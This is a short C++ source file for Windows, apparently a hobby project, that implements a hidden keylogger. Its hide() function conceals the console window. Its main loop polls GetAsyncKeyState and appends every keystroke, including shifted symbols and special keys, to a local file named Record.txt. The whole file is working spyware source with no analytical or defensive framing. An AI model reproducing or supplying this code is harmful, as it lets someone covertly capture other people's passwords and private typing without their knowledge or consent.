#include<iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>
using namespace std;
void keylogger();
void hide();
int main(){
    hide();
	keylogger();
	return 0;
}

void hide(){
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}

void keylogger(){
	
		char key;
	
	for(;;){
		for(key=8;key<222;key++){
			if(GetAsyncKeyState(key)==-32767){
				
				ofstream write("Record.txt",ios::app);
				
				if((key>64)&&(key<91)&& !(GetAsyncKeyState(0x10))){
					
					key+=32;
					write << key;
					write.close();
					break;
				}
				else if((key>64)&&(key<91)){
					write << key;
					write.close();
					break;
				}
				else
				{
					switch(key)
					{
						case 48:
						{
							if(GetAsyncKeyState(0x10))
							write <<")";
							else write<<"0";
							}
							break;
						case 49:
						{
							if(GetAsyncKeyState(0x10))
							write <<"!";
							else write<<"1";
							}
							break;
						case 50:
						{
							if(GetAsyncKeyState(0x10))
							write <<"@" ;
							else write<<"2";
							}
							break;
						case 51:
						{
							if(GetAsyncKeyState(0x10))
							write <<"#";
							else write<<"3";
							}
							break;
						case 52:
						{
							if(GetAsyncKeyState(0x10))
							write <<"$";
							else write<<"4";
							}
							break;
						case 53:
						{
							if(GetAsyncKeyState(0x10))
							write <<"%";
							else write<<"5";
							}
							break;
						case 54:
						{
							if(GetAsyncKeyState(0x10))
							write <<"^";
							else write<<"6";
							}
							break;
						case 55:
						{
							if(GetAsyncKeyState(0x10))
							write <<"&";
							else write<<"7";
							}
							break;
						case 56:
						{
							if(GetAsyncKeyState(0x10))
							write <<"*";
							else write<<"8";
							}
							break;
						case 57:
						{
							if(GetAsyncKeyState(0x10))
							write <<"(";
							else write<<"9";
							}
							break;
						case VK_SPACE:
							write <<" ";
						break;
						case VK_RETURN:
							write <<"\n";
						break;
						case VK_TAB:
							write <<"<Tab>";
						break;
						case VK_BACK:
							write <<"<BackSpace>";
						break;
						case VK_ESCAPE:
							write <<"<Esc>";
						break;
						case VK_DELETE:
							write <<"<Delete>";
						break;
							
					}
					
				}
				
				
				
				
				/*switch(c){
					case 8: write <<"<BackSpace>";
					case 27: write <<"<Esc>";
					case 127:write<<"<DEL>";
					case 32: write<<" ";
					case 13:write<<"<Enter>\n";
					default:write << c;
				}*/
				
			}
		}
	}

}
